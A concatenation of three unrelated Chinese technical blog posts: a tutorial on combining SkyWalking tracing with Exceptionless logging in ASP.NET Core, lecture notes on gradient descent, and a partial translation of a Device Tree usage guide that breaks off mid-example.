1.SkyWalking和Exceptionless的存储和检索都是使用的ElasticSearch，ES的强大之处不用介绍:“you know, for search”
2.SkyWalking作为国人（吴晟）开发的一套开源追踪系统，虽然比不上Pinpoint功能强大，但社区活跃且免费，相信开源的力量，会越来越完善，甚至更好。
3.Exceptionless作为.Net开源社区的新起之秀，目前也十分活跃，原生.Net语言支持，能做到日后无缝扩展。
 
新建多个站点（物理节点）
传统单体应用（或站点）没必须要做到APM追踪，因为她毫无意义。只有在分布式架构模式下，例如SOA、微服务等架构才有意义，比如说，你在两个地方分别部署了多个应用，当某个地方的应用出现了故障，你总不可能专门跑去一个一个文件的查阅日志吧，假如这个应用部署在火星呢（哈哈，开个玩笑）。
我们就SkyApm-dotnet中的Sample做一些二次修改和扩展，来模拟一个实际的分布式系统。
先看看这个系统的网络拓扑图：



asp-net-core-*为系统主要节点，而localhost:50000为Exceptionless的日志中心，114.215是数据库，具体每个线条的颜色请查阅SkyWalking手册。
asp-net-core-aspnetcore：我们可以把她理解为请求端，笔者在里面做了一个单请求，和一个并行请求，严格意义上来说，代码中不应该有try catch来进行重试，而是应该使用polly的Retry进行重试和异常处理，可以参考《NET Core微服务之路：弹性和瞬态故障处理库Polly的介绍》，代码参考如下：


[Route("api/[controller]")]
[ApiController]
public class ValuesController : ControllerBase
{
    [HttpGet]
    public async Task<string> Get()
    {
        var httpClient = new HttpClient();
        var values = await httpClient.GetStringAsync("http://localhost:5001/api/values");
        ExceptionlessClient.Default.SubmitLog(JsonConvert.SerializeObject(values), LogLevel.Debug);
        return values;
    }


    [HttpGet("getall")]
    public string GetAll()
    {
        var list = new List<int>();
        var listValue = new List<string>();
        for (var i = 1; i <= 50; i++)
        {
            list.Add(i);
        }


        Parallel.ForEach(list, (i, state) =>
        {
            try
            {
                using (var httpClient = new HttpClient())
                {
                    listValue.Add(httpClient.GetStringAsync($"http://localhost:5001/api/values/{i}/other").Result);
                }
            }
            catch (Exception)
            {
                // ignored
            }
        });
        ExceptionlessClient.Default.SubmitLog(JsonConvert.SerializeObject(listValue), LogLevel.Debug);
        return JsonConvert.SerializeObject(listValue);
    }
}

asp-net-core-frontend：我们可以把她理解为一个网关，一个中继，或者一个权限验证等等，笔者没做太多处理，就单纯做了一个switch的参数选择桥接，参考代码如下：

[Route("api/[controller]")]
[ApiController]
public class ValuesController : ControllerBase
{
    [HttpGet]
    public async Task<string> Get()
    {
        var httpClient = new HttpClient();
        var values = await httpClient.GetStringAsync("http://localhost:5002/api/values");
        return values;
    }


    [HttpGet("{id:int}/other")]
    public async Task<string> Get(int id)
    {
        var httpClient = new HttpClient();
        var values = "";
        switch (id)
        {
            case 1:
                values = await httpClient.GetStringAsync("http://localhost:5002/api/delay/100");
                break;
            case 2:
                values = await httpClient.GetStringAsync("http://localhost:5002/api/Error");
                break;
            case 3:
                values = await httpClient.GetStringAsync("http://localhost:5002/api/Values");
                break;
            case 4:
                values = await httpClient.GetStringAsync("http://localhost:5002/api/Apps");
                break;
            case 5:
            {
                var userClient = new User.UserClient(new Channel("127.0.0.1:5050", ChannelCredentials.Insecure));
                var response = await userClient.GetListAsync(new GetListRequest());
                if (response.Code == 1000)
                {
                    return JsonConvert.SerializeObject(response.Data);
                }


                break;
            }
        }


        return values;
    }
}

asp-net-core-backend：我们可以把她理解为一个节点，笔者还创建了一个Grpc的服务节点，不知是因为目前SkyApm-dotnet探针没做Grpc的适配，还是笔者这边配置错误，目前并未实现Grpc的追踪，代码较多，就不一一的贴上来了，做个截图即可，源码在文章最后

 
附加SkyApm-dotnet程序集到宿主
我们在启动Aspnetcore应用的时候，可以通过Appsettings.*.json来配置应用的环境参数，比如ASPNETCORE_ENVIRONMENT，可以设置当前应用的环境是开发（Development）还是生产（Production），关于多环境的介绍，可以参考这篇文章https://docs.microsoft.com/en-us/aspnet/core/fundamentals/environments?view=aspnetcore-2.0。而SkyApm-dotnet的最大优势，就是达到了开箱即用，我们只需要通过ASPNETCORE_HOSTINGSTARTUPASSEMBLIES参数来指定SkyApm即可，当然，你可以使用set ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=SkyApm.Agent.AspNetCore，也可以通过配置文件来启用SkyApm.Agent.AspNetCore。ASPNETCORE_HOSTINGSTARTUPASSEMBLIES是个什么鬼，我们来查一查微软官方的解释（地址https://docs.microsoft.com/en-us/aspnet/core/fundamentals/host/platform-specific-configuration?view=aspnetcore-2.0）：


An IHostingStartup (hosting startup) implementation adds enhancements to an app at startup from an external assembly. For example, an external library can use a hosting startup implementation to provide additional configuration providers or services to an app. IHostingStartup is available in ASP.NET Core 2.0 or later.


通过追加外部程序集来增强宿主功能，例如，可以在外部程序集中提供额外的服务或配置，此项功能支持NET Core 2.0+。
当然，能加载也就能禁用 ，使用ASPNETCORE_PREVENTHOSTINGSTARTUP便可实现。除以上通过set的方式配置环境参数以外，还可以通过代码的方式来指定ASPNETCORE_HOSTINGSTARTUPASSEMBLIES启动扩展程序集。

Environment.SetEnvironmentVariable("ASPNETCORE_HOSTINGSTARTUPASSEMBLIES", "SkyAPM.Agent.AspNetCore");

对了，在WebHosting的环境变量定义中，默认提供了如下环境变量，有兴趣的朋友可深入研究。

 
SkyApm-dotnet的日志入口
在SkyApm-dotnet的配置文件中，默认是开启了本地日志的，像这样


"Logging": {
  "Level": "Information",
  "FilePath": "logs/skyapm-{Date}.log"
},


如果部署了多个SkyApm-dotnet探针到节点，那是不是要在多个节点上来查阅日志呢？答案肯定是拒绝的，如果这样下来，那么我们的日志收集中心就没有任何存在的意义了。所以，为了实现这个功能，找到了SkyApm.Logging.ILoggerFactory的接口，使用再次注入的方式，替换了原来默认的DefaultLoggerFactory（当然，如果有更好的方式，或者已经提供了接口，麻烦大家告知一下），这是默认日志注入的源码：

可以看到，SkyApm-dotnet的日志默认通过ServiceCollection进行注入，我们只需要实现ILoggerFactory便可实现自定义的日志处理方式。
 
继承ILoggerFactory获取全局ILogger对象
通过F12我们可以定位接口的具体源码定义，可以看到SkyApm.Logging中，定义了一个ILoggerFactory的接口定义，内部需实现一个Ilogger的创建，代码源码截图如下：

我们可以实现这个接口，定义为我们自己实现的处理方式。但是，其实我们可以将源码拷贝过来，因为我们仍然需要将日志保存在本地作为副本，而不是单纯将日志发送到日志中心，所以需要另起一个实现的名字，我这里取名叫SkyApmExtensionsLoggerFactory，源码如下：


namespace SkyApmExceptionless
{
    public class SkyApmExtensionsLoggerFactory : SkyApm.Logging.ILoggerFactory
    {
        private const string OutputTemplate =
            @"{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{ServiceName}] [{Level}] {SourceContext} : {Message}{NewLine}{Exception}";


        private readonly LoggerFactory _loggerFactory;


        public SkyApm.Logging.ILogger CreateLogger(Type type)
        {
            return new SkyApmExtensionsLogger(_loggerFactory.CreateLogger(type));
        }


        public SkyApmExtensionsLoggerFactory(IConfigAccessor configAccessor)
        {
            _loggerFactory = new LoggerFactory();


            var loggingConfig = configAccessor.Get<LoggingConfig>();
            var instrumentationConfig = configAccessor.Get<InstrumentConfig>();
            var level = EventLevel(loggingConfig.Level);


            _loggerFactory.AddSerilog(new LoggerConfiguration().MinimumLevel.Verbose().Enrich
                .WithProperty("SourceContext", null).Enrich
                .WithProperty(nameof(instrumentationConfig.ServiceName),
                    instrumentationConfig.ServiceName ?? instrumentationConfig.ApplicationCode).Enrich
                .FromLogContext().WriteTo.RollingFile(loggingConfig.FilePath,
                    level,
                    OutputTemplate,
                    null,
                    1073741824,
                    31,
                    null,
                    false,
                    false,
                    TimeSpan.FromMilliseconds(500)).CreateLogger());
        }


        private static LogEventLevel EventLevel(string level)
        {
            return Enum.TryParse<LogEventLevel>(level, out var logEventLevel)
                ? logEventLevel
                : LogEventLevel.Error;
        }
    }
}

从上面的代码加粗的代码中可以看到，通过ILoggerFactory创建了一个SkyApm.Logging.ILogger的实现SkyApmExtensionsLogger，这样，我们便拿到的SkyApm.Logging.ILoggerFactory的ILogger接口，接下来便是将ILogger的具体实现功能写到Exceptionless。
 

将Logger写入到Exceptionless
先看看SkyApm.Logging.ILogger的接口定义，源码截图如下：

超级简单，跟NLog，Log4net等等日志组件的接口定义大同小异，几乎可以说是一样的，包含Debug, Information, Warning, Error, Trace，接下来该怎么做，就变得十分简单了，不过，在写入这个日志前，先简单了解一下Exceptionless的用法。
 
1.创建一个日志。源码定义为Source，我觉得叫组比较容易理解，她就像一个分类器，指定她的名称是SkyApmExtensionsLogger，其次，可以提交不同的日志类型，Exceptionless定义了如下几种日志等级，其实有部分我们用不着。



ExceptionlessClient.Default.CreateLog(nameof(SkyApmExtensionsLogger), "Create logging started.", Exceptionless.Logging.LogLevel.Info).Submit();

 
2.创建一个会话Session。ession会话的作用在Exceptionless算是一个特殊功能的存在了，她可以自动发送会话开始，会话心跳和会话结束事件，使用非常简单，后面会截图介绍这个功能的作用。

ExceptionlessClient.Default.Configuration.UseSessions();

 
OK，Exceptionless就介绍这么点用法（详细更多用法可参考官网），已经可以满足日志的写入（或收集）了，接下来看看完整的源码：


using System;
using Exceptionless;
using Microsoft.Extensions.Logging;

namespace SkyApmExceptionless
{
    internal class SkyApmExtensionsLogger : SkyApm.Logging.ILogger
    {
        private readonly ILogger _readLogger;


        public SkyApmExtensionsLogger(ILogger readLogger)
        {
            _readLogger = readLogger;
            ExceptionlessClient.Default.CreateLog(nameof(SkyApmExtensionsLogger), "Create logging started.", Exceptionless.Logging.LogLevel.Info).Submit();
            ExceptionlessClient.Default.Configuration.UseSessions();
            ExceptionlessClient.Default.Configuration.SetUserIdentity("SetUserIdentity", $"{nameof(SkyApmExtensionsLogger)} Groups");
        }


        public void Debug(string message)
        {
            _readLogger.LogDebug(message);
            ExceptionlessClient.Default
                .CreateLog(nameof(SkyApmExtensionsLogger), message, Exceptionless.Logging.LogLevel.Debug).Submit();
        }


        public void Information(string message)
        {
            _readLogger.LogInformation(message);
            ExceptionlessClient.Default
                .CreateLog(nameof(SkyApmExtensionsLogger), message, Exceptionless.Logging.LogLevel.Info).Submit();
        }


        public void Warning(string message)
        {
            _readLogger.LogWarning(message);
            ExceptionlessClient.Default
                .CreateLog(nameof(SkyApmExtensionsLogger), message, Exceptionless.Logging.LogLevel.Warn).Submit();
        }


        public void Error(string message, Exception exception)
        {
            _readLogger.LogError(message + Environment.NewLine + exception);
            ExceptionlessClient.Default
                .CreateLog(nameof(SkyApmExtensionsLogger), message + Environment.NewLine + exception,
                    Exceptionless.Logging.LogLevel.Error)
                .Submit();
        }


        public void Trace(string message)
        {
            _readLogger.LogTrace(message);
            ExceptionlessClient.Default
                .CreateLog(nameof(SkyApmExtensionsLogger), message, Exceptionless.Logging.LogLevel.Trace).Submit();
        }
    }
}


这样，通过SkyApm-dotnet生成的日志，将自动发送到Exceptionless日志中心去，是不是非常简单。当然，如果作者有更好的建议，欢迎分享和交流。

 
 
SkyWalking和Exceptionless的结合分析
通过上面的扩展和部署，我们已经可以开始跑起来玩一玩了，如果有小伙伴跑不通，或者懒得敲代码（哎...），源码在文章结尾，但如何配置环境还请自行搜索，以免浪费篇幅。
万恶的再来两张截图，哈哈，其实是先看看默认状态下SkyWalking和Exceptionless的初始界面。


 
让我们启动这个项目。嗯，很好，发现日志正在蹭蹭的上涨，再来一张万恶的全屏截图。

 
我们并没运行任何一个接口，也并没调用任何一个接口，这日志是哪来的呢，对，就是SkyApm-dotnet的日志，我们可以通过Session里面查看到SkyApmExtensionsLogger正在不断的追加日志，这是因为SkyApm-Agent正在运行追踪，这里也清晰的解释了Session事件在这个SkyApmExtensionsLogger中的作用（目前还在不断的追加中）。

 
再看看SkyWalking，很好，出现了三个服务（节点）

 
运行一下，代码在上面，万恶的全屏截图再来一张：

 
我们发现，在ListMode中有报错的情况，这样：

 
赶紧定位到日志，搜索Api/Error

 
嗯，这正是刚才刷新两次所产生的错误结果，也是笔者故意抛出的，查看一下详情


 
确实由于5001上面接受到了远程返回404错误，因为这个接口实际就不存在。
反之，你也可以通过Exceptionless的exception模块或其他日志来反查SkyWalking详情，但是这样的效率不高。
万恶的全屏截图已结束，感谢！
 
总结
通过APM和日志中心（例如SkyWalking和Exceptionless）进行整合分析的场景越来越被重视和使用，如果还是停留在单个日志分析，或者单个APM分析，那么随着节点数的增加，服务的规模增加，那将无法及时确定问题所在的。还有更多的结合用法，欢迎小伙伴们共同交流。

 
参考
Exceptionless : https://github.com/exceptionless/Exceptionless/wiki
SkyApm-dotnet Sample : https://github.com/SkyAPM/SkyAPM-dotnet/tree/master/sample
 
源码下载https://files-cdn.cnblogs.com/files/SteveLee/Sample.7z
 
感谢阅读！
 



********************************************************************************************************************************************************************************************************
李宏毅机器学习笔记2：Gradient Descent(附带详细的原理推导过程）
李宏毅老师的机器学习课程和吴恩达老师的机器学习课程都是都是ML和DL非常好的入门资料，在YouTube、网易云课堂、B站都能观看到相应的课程视频，接下来这一系列的博客我都将记录老师上课的笔记以及自己对这些知识内容的理解与补充。(本笔记配合李宏毅老师的视频一起使用效果更佳！）
今天这篇文章的主要内容是第3课的笔记
 
ML Lecture 3: Gradient Descent
1.要真正理解梯度下降算法的原理需要一定的数学功底、比如微积分、泰勒展开式等等......本文将从一个下山的场景开始，先提出梯度下降算法的基本思想，进而从数学上解释梯度下降算法的原理，
2.梯度下降的场景假设：梯度下降法的基本思想可以类比为一个下山的过程。假设这样一个场景：一个人被困在山上，需要从山上下来(i.e. 找到山的最低点，也就是山谷)。但此时山上的浓雾很大，导致可视度很低。因此，下山的路径就无法确定，他必须利用自己周围的信息去找到下山的路径。这个时候，他就可以利用梯度下降算法来帮助自己下山。具体来说就是，以他当前的所处的位置为基准，寻找这个位置最陡峭的地方，然后朝着山的高度下降的地方走，同理，如果我们的目标是上山，也就是爬到山顶，那么此时应该是朝着最陡峭的方向往上走。然后每走一段距离，都反复采用同一个方法，最后就能成功的抵达山谷。我们同时可以假设这座山最陡峭的地方是无法通过肉眼立马观察出来的，而是需要一个复杂的工具来测量，同时，这个人此时正好拥有测量出最陡峭方向的能力。所以，此人每走一段距离，都需要一段时间来测量所在位置最陡峭的方向，这是比较耗时的。那么为了在太阳下山之前到达山底，就要尽可能的减少测量方向的次数。这是一个两难的选择，如果测量的频繁，可以保证下山的方向是绝对正确的，但又非常耗时，如果测量的过少，又有偏离轨道的风险。所以需要找到一个合适的测量方向的频率(即学习率)，来确保下山的方向不错误，同时又不至于耗时太多！
3.梯度下降：梯度下降的基本过程就和下山的场景很类似。首先，我们有一个可微分的函数。这个函数就代表着一座山。我们的目标就是找到这个函数的最小值，也就是山底。根据之前的场景假设，最快的下山的方式就是找到当前位置最陡峭的方向，然后沿着此方向向下走，对应到函数中，就是找到给定点的梯度 ，然后朝着梯度相反的方向，就能让函数值下降的最快！(那为什么最陡峭的方向就是函数值下降最快的方向呢？这个问题就涉及到了梯度下降的原理，在后面将会详细解释）
4.大致理解了梯度下降之后，接下来让我们回到老师的PPT
看到这可能有些人有这样的疑惑：为什么梯度下降的公式中间是减号而不是加号呢？接下来通过一张图片你就会理解了
假设现在我们处在小猴子的问题，通过求导我们可以轻而易举的画出蓝色的切线，切线的斜率即为梯度值，根据图片可以知道，要是小猴子想达到最低点，就必须往W轴正方向移动，也就是增大W的值，而根据切线的方向可是知道该值为负，所以要想使W变大就必须使用负号，负负得正。
5.梯度下降的三个技巧
（1）Tuning your learning rates
从图中可以看出学习率对梯度下降的影响力还是比较大的。在用梯度下降时最好画出loss随更新参数次数的曲线（如图），看一下前几次更新参数时曲线的走法如何。 如何做到调整学习率呢？其中一个思路是：每几个epoch之后就降低学习率（一开始离目标远，所以学习率大些，后来离目标近，学习率就小些），并且不同的参数有不同的学习率。接下来就让我们学习梯度下降中的一个方法Adagrad。
这样操作后，每组参数的learning rate 都不同。
举个例子帮助大家更好的理解：
通过Adagrad后，我们的参数变化或者梯度下降公式可改写为：
如何理解Adagrad的参数更新式子呢？(以一元二次函数为例)

（2）Stochastic Gradient Descent(SGD)
 SGD让训练过程更快。普通GD是在看到所有样本（训练数据）之后，计算出损失L，再更新参数。而SGD是每看到一个样本就计算出一个损失，然后就更新一次参数。
（3）Feature Scaling
如果不同参数的取值范围大小不同，那么loss函数等高线方向（负梯度方向，参数更新方向）不指向loss最低点。feature scaling让不同参数的取值范围是相同的区间，这样loss函数等高线是一系列共圆心的正圆，更新参数更容易。 feature scaling的做法是，把input feature的每个维度都标准化（减去该维度特征的均值，除以该维度的标准差）。
6.高能预警：梯度下降算法的原理！(需要一定的数学功底，比如微积分、泰勒展开式)
（1）如下图所示，整个平面表示一个损失函数，要求整个平面的最小值，可以把这个问题分解成随机给定一点和一个很小的范围，求出这个范围内的最小值，然后在以这个最小值为中心点，结合给定的小范围反复求解
（2）如何求出一个指定很小范围内的最小值呢？这就需要用到泰勒级数了。
（3）当有两个变量的时候，泰勒级数变为：
 

（4）将常量为字母替代，等式改写为：
（5）如下图所示：因为要求最小值且s为常量，所以可以先忽略s的影响，所以损失函数的计算就变为了两个向量之间的乘法，且其中向量(u,v)的方向和大小是已知的，当(theta1,theta2)与(u,v)反向的时候，两个向量相乘的结果最小。又因为是在一个以(theta1,theta2)为圆心的小范围内，所以可以在(theta1,theta2)之前乘上一个值，让这个向量的长度正好等于这个小圆的半径，这样我们就求出了损失函数的最小值。

 
（6）经过这个推导的过程，想必大家也都能明白为什么在梯度下降中的学习率不能太大。因为，若要满足梯度下降的表达式，就必须要满足泰勒级数，而我们只取泰勒级数前两项的条件是x必须非常接近x0,也就是说我们的那个红色的圆的半径必须足够小，因为(theta1,theta2)*学习率=圆的半径，既然圆的半径必须要足够小，所以推导除了学习率正比与圆的半径，也要足够小！

 
 
 梯度下降面临的主要挑战和解决方法：
（1）局部最小值

到目前为止来说，梯度下降看起来是一个非常美好的童话。不过我要开始泼凉水了。还记得我之前说过，我们的损失函数是一个非常好的函数，这样的损失函数并不真的存在？我们以神经网络为例，神经网络是复杂函数，具有大量非线性变换。由此得到的损失函数看起来不像一个很好的碗，只有一处最小值可以收敛。实际上，这种圣人般的损失函数称为凸函数，而深度网络的损失函数几乎总是非凸的事实上，损失函数可能是这样的
上图中有一个梯度为零的局部极小值。然而，我们知道那不是我们能达到的最低损失（全局最小值）。如果初始权重位于点A，那么我们将收敛于局部极小值，一旦收敛于局部极小值，梯度下降无法逃离这一陷阱。梯度下降是由梯度驱动的，而梯度在任何极小值处都是零。局部极小值，顾名思义，是损失函数在局部达到最小值的点。而全局最小值，是损失函数整个定义域上可以达到的最小值。让事情更糟的是，损失等值曲面可能更加复杂，实践中可没有我们考虑的三维等值曲面。实践中的神经网络可能有上亿权重，相应地，损失函数有上亿维度。在那样的图像上梯度为零的点不知道有多少。
（2）鞍点
鞍点因形状像马鞍而得名。鞍点处，梯度在一个方向（X）上是极小值，在另一个方向上则是极大值。如果沿着X方向的等值曲面比较平，那么梯度下降会沿着Ÿ方向来回振荡，造成收敛于最小值的错觉。

 解决这两个问题的主要方法是-随机性
 具体有以下三种方法：批量梯度下降、小批量梯度下降、随机梯度下降(见上一篇博客）
 
 
 
 参考：https://blog.csdn.net/weixin_42398658/article/details/84502215
　　　 https://blog.csdn.net/soulmeetliang/article/details/72830179
 
 
以上就是本节课所学和理解的知识点，欢迎大家指正!
 
********************************************************************************************************************************************************************************************************
理解Device Tree Usage


英语原文地址： htttp://devicetree.org/Device_Tree_Usage
本文介绍如何为新的机器或板卡编写设备树（Device Tree）， 它旨在概要性的介绍设备树概念，以及如何使用它们来描述机器或者板卡。
有关设备树数据格式的完整技术描述，请参阅ePAPR v1.1规范。 ePAPR技术规范比本文所介绍的基础主题更加详细，所以请参阅它了解本页未涉及的更高级用法。 ePAPR目前正在用Devicetree规范文档的新名称进行更新。
 
基础数据结构
设备树（Device Tree）是一种包含节点和属性的简单树形结构。属性是键值对，节点则可能包含属性和子节点。 例如，下面是一个.dts格式的简单设备树:


/dts-v1/;
 
/ {
    node1 {
        a-string-property = "A string";
        a-string-list-property = "first string", "second string";
        // hex is implied in byte arrays. no '0x' prefix is required
        a-byte-data-property = [01 23 34 56];
        child-node1 {
            first-child-property;
            second-child-property = <1>;
            a-string-property = "Hello, world";
        };
        child-node2 {
        };
    };
    node2 {
        an-empty-property;
        a-cell-property = <1 2 3 4>; /* each number (cell) is a uint32 */
        child-node1 {
        };
    };
};

 

上面这个设备树，显然没有实际用处，因为它没有描述任何信息，但是它确实显示了节点的结构和属性：


一个简单的root节点：“/”


一组子节点：“node1”和“node2”


一组node1的子节点：“child-node1”和“child-node2”


一堆分散在设备树中的属性


属性是简单的键-值对，其中的值可以是空的，也可以包含任意的字节流。虽然数据类型没有编码到数据结构中，但是有一些基本的数据表示可以在设备树源文件中表示。


文本字符串(以null结尾)，用双引号表示:



string-property = "a string";



‘cell’是被<>括号括起来的32bit无符号int数



cell-property = <0xbeef 123 0xabcd1234>;



 二进制数据是被[]括号括起来



binary-property = [0x01 0x23 0x45 0x67];



 不同类型的数据，可以以逗号“，”串起来



 mixed-property = "a string", [0x01 0x23 0x45 0x67], <0x12345678>;



 逗号“，”也可以用来表示字符串列表：



 string-list = "red fish", "blue fish";



基础概念Basic Concepts
为了理解设备树（device tree）如何使用，我们将从一个简单的设备（machine）开始，建立一个设备树（device tree），然后一步一步描述它。
示例设备（sample machine）
假设有这样一台虚拟的设备（基于ARM的通用版本），由“Acme”公司生产，名为“Cpyote's Revenge”:


一个32位宽的ARM CPU


处理器本地总线连接到内存映射串口、spi总线控制器、i2c控制器、中断控制器和外部总线桥


从0地址开始的256MB 字节的SDRAM


2个串口，寄存器基地址分别是0x101F1000和0x101F2000


GPIO的控制寄存器的基地址是0x101F3000


SPI的控制寄存器的基地址是0x10170000，并挂载下列设备



MMC slot，SS管脚连接到GPIO1



外部总线桥接着下列设备



SMC SMC91111网络设备连接到外部总线，基地址是0x10100000


i2c 控制寄存器基地址是0x10160000，并挂载下列设备



Maxim DS1338实时时钟，其地址是1101000（0x58）



64M的Nor flash基地址是0x30000000



初始化结构体（Initial structure）
第一步是为设备铺设骨架， 这是有效设备树所需的最小结构。在这一阶段，你需要能唯一的标识设备。


/dts-v1/;
 
/ {
    compatible = "acme,coyotes-revenge";
};


 

“compatible”表明系统的名字。它包含一个以“制造商”，“品牌”形式组成的字符串。准确的表明设备非常重要，而且需要包含制造商的名称以避免命名冲突。 由于操作系统将使用compatible值来决定如何在机器上运行，因此将正确的数据写入此属性中非常重要。理论上，一个操作系统唯一识别一台设备只要有“compatible”属性就够了。如果所有设备细节都是硬编码的，那么操作系统可以专门在Device Tree的最顶层的“compatible”属性中查找 "acme,coyotes-revenge"即可。
 
CPUs
下一步是描述每一个CPU。添加一个名为“cpus”的容器节点，为每一个CPU创建一个子节点。在当前的例子里，该系统是一个源自ARM的双核Cortex A9系统。


/dts-v1/;
 
/ {
    compatible = "acme,coyotes-revenge";
    cpus {
        cpu@0 {
            compatible = "arm,cortex-a9";
        };
        cpu@1 {
            compatible = "arm,cortex-a9";
        };
    };
};


 
每个CPU节点的“compatible”的属性都是一个字符串，以“制造商”，“型号”的形式表明CPU的准确型号，就像设备树（DT）最顶层的“compatible”属性一样。
稍后将向cpu节点添加更多属性，但是我们首先需要讨论更多的基本概念。
节点名字（Node Names）
首先，我们需要了解命名的规则。每一个节点必须有一个名字，名字的形式必须是“ <name>[@<unit-address>”。<name>是一个简单的ascii字符串，最大长度为31字节。通常，节点是根据它所代表的设备来命名。比如，一个3com公司的网络适配器的名字可能会是“ethernet”，而不是“3com509”。如果这个节点描述设备需要一个地址，则包含“<unit-address>”字段。通常，这个地址是访问该设备寄存器所需要的首地址。而且会列在node的“reg”属性里。关于“reg”属性将在本文后续的内容中介绍。兄弟节点的名字不能相同，但是通常都是<name>字段相同，而<unit-address>字段不同（ (比如, serial@101f1000 & serial@101f2000).）。可以查阅ePAPR的2.2.1节来了解节点命名的全部细节。
设备（Devices）
系统中的每个设备都由一个设备树节点表示。下一步是用每个设备的对应的节点填充树。现在，新的节点将保持为空，直到我们可以讨论如何处理地址范围和irq。


/dts-v1/;
 
/ {
    compatible = "acme,coyotes-revenge";
 
    cpus {
        cpu@0 {
            compatible = "arm,cortex-a9";
        };
        cpu@1 {
            compatible = "arm,cortex-a9";
        };
    };
 
    serial@101F0000 {
        compatible = "arm,pl011";
    };
 
    serial@101F2000 {
        compatible = "arm,pl011";
    };
 
    gpio@101F3000 {
        compatible = "arm,pl061";
    };
 
    interrupt-controller@10140000 {
        compatible = "arm,pl190";
    };
 
    spi@10115000 {
        compatible = "arm,pl022";
    };
 
    external-bus {
        ethernet@0,0 {
            compatible = "smc,smc91c111";
        };
        i2c@1,0 {
            compatible = "acme,a1234-i2c-bus";
            rtc@58 {
                compatible = "maxim,ds1338";
            };
        };
        flash@2,0 {
            compatible = "samsung,k8f1315ebm", "cfi-flash";
        };
    };
};


 
在上面这个树中，已经为系统中的每个设备都添加了一个节点，层次结构反映了设备如何连接到系统。比如，外部总线上的设备是外部总线节点的子节点，i2c设备是i2c总线控制器节点的子节点。通常，层级结构表示的是从CPU的角度来看系统的视图。
这个设备树还不能使用，是因为它缺少设备之间的连接信息，接下来会添加进来。
需要注意的是：


每一个节点都有一个“compatible”属性


flash节点的“compatible”属性包含了两个字符串，下一节将说明为什么


就像之前提到的，节点名字反映的是设备的种类，而不是代表具体的品牌型号。 请参阅ePAPR规范的2.2.2节，其中列出了已定义的通用节点名。应该尽可能使用这些节点名，而不要发明新的名字。


理解“compatible”属性
设备树中每一个表示设备的节点都要有“compatible”属性。 “compatible”属性是操作系统用来决定将哪个设备驱动程序绑定到这个设备的关键。
“compatible”是一个字符串列表，列表中的第一个字符串以“制造商”，“型号”的形式指定确切的设备。接下来的字符串表示该设备兼容的其他设备。例如，Freescale MPC8349片上系统（Soc）有一个串行设备，执行National Semiconductor的 ns16550 寄存器接口。那么Freescale MPC8349的串行设备的“compatible”属性就是“ fsl,mpc8349-uart”，“ns16550”.在这个例子里，“ fsl,mpc8349-uart”表示确切的设备，“ns16550”表示它在寄存器级别与National Semiconductor的ns16550串行设备兼容。这里的“ns16550”没有制造商的名字，是由于历史原因。所有新的兼容性设备名称，都需要加制造商的名字。这种做法允许将现有设备驱动程序绑定到新设备，同时仍然惟一地标识确切的硬件。
警告：不要使用通配符来实现兼容性，比如 "fsl,mpc83xx-uart"或者类似的值。但芯片供应商总是会修改命名规则，一旦等到其改变打破了你的通配符假设，再来修改就已经晚了。所以，请选择一个具体的芯片型号，然后再兼容性列表里面列出所兼容的芯片型号。
 
如何寻址（How addressing work）
可寻址设备使用以下属性将地址信息编码到设备树中:


* reg
* #address-cells
* #size-cells


每一个可寻址设备都有一个叫“reg”的属性，reg由一系列元组构成，形式是reg = <address1 length1 [address2 length2] [address3 length3] ... >。也就是address、length交替出现。每一个元组代表一个设备使用的地址范围。每一个地址的值是一个或者多个32位int型数构成的列表，称为cells。长度的取值也是一个cells列表，或者为空。
由于address和length字段都是可变大小的变量，因此父节点中的#address-cells和#size-cells属性用于说明每个字段中有多少个单元格。换句话说，正确地解释reg属性需要父节点的#address-cells和#size-cells值。要了解这一切是如何工作的，让我们将寻址属性添加到示例设备树中，从cpu开始。#address-cells表示address的长度，#size-cells表示length的长度，如果为0，则表示没有。

CPU寻址
当讲述如何寻址的时候，CPU节点是一个最简单的例子。每个CPU被分配一个唯一的ID，而且这个ID没有关于size的描述。


    cpus {
        #address-cells = <1>;
        #size-cells = <0>;
        cpu@0 {
            compatible = "arm,cortex-a9";
            reg = <0>;
        };
        cpu@1 {
            compatible = "arm,cortex-a9";
            reg = <1>;
        };
    };


在cpu节点中，将#address-cells设置为1，将#size-cells设置为0。这意味着子reg值是一个uint32数，它是一个没有size字段的地址。在这种情况下，为这两个cpu分配了地址0和1。对于cpu节点，#size-cells为0，因为每个cpu只分配一个地址，没有其他的地址。
您还会注意到reg值与节点名中的@符号后面的值相同。按照习惯，如果节点具有reg属性，那么节点名必须包含单元地址，而且是reg属性中的第一个地址的值。
内存映射设备
与CPU节点只有一个地址值不同，内存映射设备会分配一个它需要响应的地址区间。#size-cells表示reg中length的位宽，如果是32位宽就是1,64位宽就是2.在下面的示例里，每个address值是1个单元格（32位），每个length也是一个单元格（32位），这在32位操作系统中是非常常见的。在64位系统可能将#address-cells、#size-cells都设置为2，从而完成64位地址空间的寻址。


/dts-v1/;
 
 
/ {
    #address-cells = <1>;
    #size-cells = <1>;
 
    ...
 
    serial@101f0000 {
        compatible = "arm,pl011";
        reg = <0x101f0000 0x1000 >;
    };
 
    serial@101f2000 {
        compatible = "arm,pl011";
        reg = <0x101f2000 0x1000 >;
    };
 
    gpio@101f3000 {
        compatible = "arm,pl061";
        reg = <0x101f3000 0x1000
               0x101f4000 0x0010>;
    };
 
    interrupt-controller@10140000 {
        compatible = "arm,pl190";
        reg = <0x10140000 0x1000 >;
    };
 
    spi@10115000 {
        compatible = "arm,pl022";
        reg = <0x10115000 0x1000 >;
    };
 
    ...
 
};


每一个设备都被分配了一个基地址，以及它被分配区域的大小。在这个例子里，GPIO设备被分配了两个地址区间，  0x101f3000...0x101f3fff and 0x101f4000..0x101f400f.。
有一些设备挂载的总线的寻址方式不同。比如，有些设备挂载的总线是通过不同的片选信号线来区分设备。 由于每个父节点都为其子节点定义了寻址域，因此可以选择一种最匹配的方式来描述其子节点的寻址方式。下面的代码显示了一种挂载到外部总线的设备的寻址方式，并将片选信号编码到地址域中。

   

 external-bus {
        #address-cells = <2>;
        #size-cells = <1>;
 
        ethernet@0,0 {
            compatible = "smc,smc91c111";
            reg = <0 0 0x1000>;
        };
        i2c@1,0 {
            compatible = "acme,a1234-i2c-bus";
            reg = <1 0 0x1000>;
            rtc@58 {
                compatible = "maxim,ds1338";
            };
        };
        flash@2,0 {
